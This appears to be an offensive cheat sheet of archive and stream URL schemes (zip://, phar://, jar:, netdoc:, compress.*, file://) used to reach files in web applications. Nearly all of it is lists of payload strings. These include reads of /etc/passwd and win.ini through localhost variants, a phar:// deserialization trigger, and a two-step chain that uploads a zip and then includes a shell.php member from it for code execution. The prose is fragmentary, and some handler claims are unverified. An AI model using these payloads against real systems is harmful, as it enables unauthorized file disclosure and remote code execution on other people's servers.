# Archive Deep — reading inside archives as files

## The archive-scheme family — `#`/`!` separators

```
zip://x.zip#member
zip:///x.zip#member
zip://./x.zip#member
zip://./x.zip%23member           — URL-encoded #
rar://x.rar#member
rar:///x.rar#member
phar://x.phar/member
phar://./x.phar/member
phar:///x.phar/member
jar:x.jar!/member
jar:file:///x.jar!/member
jar:nested:/x.jar/!member
war:x.war!/WEB-INF/member
war:file:///x.war!/WEB-INF/member
sar:x.sar!/META-INF/member
ear:x.ear!/META-INF/member
tar:x.tar!/member
tar:file:///x.tar!/member
tgz:x.tgz!/member
tgz:file:///x.tgz!/member
tbz:x.tbz!/member
txz:x.txz!/member
```

The `#`/`!` splits the ARCHIVE-path from the MEMBER-path — the archive
is a filesystem inside a file.

## `zip://` — the PHP zip-member

```
zip://./x.zip%23shell.php         — the member after #
zip:///tmp/x.zip%23shell.php      — absolute archive + member
zip://./x.zip%23dir/inside.php    — a member-path inside
```

`zip://` — PHP's zip-handler — reads ONE member — `allow_url_fopen` —
the member is the file.

## `phar://` — the PHP phar-member

```
phar://./x.phar/a                 — member a
phar:///tmp/x.phar/a
phar://./x.jpg/a                  — a renamed-phar — the upload chain
```

`phar://` — PHP's phar-handler — reads a member AND can trigger
deserialization — `web-deserialization`.

## `jar:`/`netdoc:` — Java's archive-URL

```
jar:file:///x.jar!/WEB-INF/web.xml
jar:nested:/x.jar/!inside
netdoc:///etc/passwd
netdoc:///C:/Windows/win.ini
```

`jar:`/`netdoc:` — Java's archive + netdoc handlers — `netdoc` reads
local files like `file:` — the netdoc-scheme.

## `rar://` — the PHP rar-member

```
rar:///tmp/x.rar%23inside.txt
rar://./x.rar%23inside.txt
```

`rar://` — PHP's rar-ext — the rar-member.

## `compress.*://` — the decompression-scheme

```
compress.zlib:///tmp/x.gz
compress.bzip2:///tmp/x.bz2
compress.zlib://./x.gz
compress.bzip2://./x.bz2
```

`compress.zlib://`/`compress.bzip2://` — the decompress-on-read — the
compressed-file-as-content.

## `ogg://` — the ogg-meta

```
ogg:///tmp/x.ogg
ogg://./x.ogg
```

`ogg://` — PHP's ogg-handler — reads ogg-metadata — rarely useful.

## `tar:`/`tgz:`/`tbz:`/`txz:` — Java's tar-family

```
tar:file:///x.tar!/member
tgz:file:///x.tgz!/member
tbz:file:///x.tbz!/member
txz:file:///x.txz!/member
```

Java's compound-scheme — the tar-member read — the compound-handler
family.

## `file:///` — the standard local-read — dir-listing in Java

```
file:///etc/passwd
file:///etc/                      — a DIR — Java lists it
file:///C:/Windows/win.ini
file://localhost/etc/passwd
file://127.0.0.1/etc/passwd
file://0.0.0.0/etc/passwd
file://[::1]/etc/passwd
file://[::]/etc/passwd
```

`file:///` — the standard local-read — Java's `file://dir/` returns
a LISTING — the dir-listing edge.

## The `phar://` deser-trigger — the archive-as-deser

`phar://x.phar/a` — the phar-metadata unserialize — the archive's
METADATA is the gadget — `web-deserialization`.

## The `zip://`+upload — the two-request chain

```
POST /upload → x.zip
GET /view?f=zip://./uploads/x.zip%23shell.php → include → exec
```

The upload+archive-member chain — `web-file-upload`+`file-read-primitives`.

## The `jar:`+`netdoc:` — the Java-archive-surface

`jar:`/`netdoc:` — Java's URL-handlers — `netdoc` = local-file-read —
`jar:` = archive-member-read — the Java scheme-family.

## The "the archive is the file" — the member-vs-archive split

The `?file=` names the ARCHIVE — the `#`/`!`-member names the FILE —
the member is the content — the member-path is the second traversal-
surface — `?file=x.zip%23../../y` doesn't escape — the member-path is
archive-internal.

## The "the archive is the read" — the archive-as-boundary

`zip://x.zip#m` reads the MEMBER inside `x.zip` — the archive-path is
the boundary — the member-path is inside — the member can't escape —
the archive IS the file-boundary.
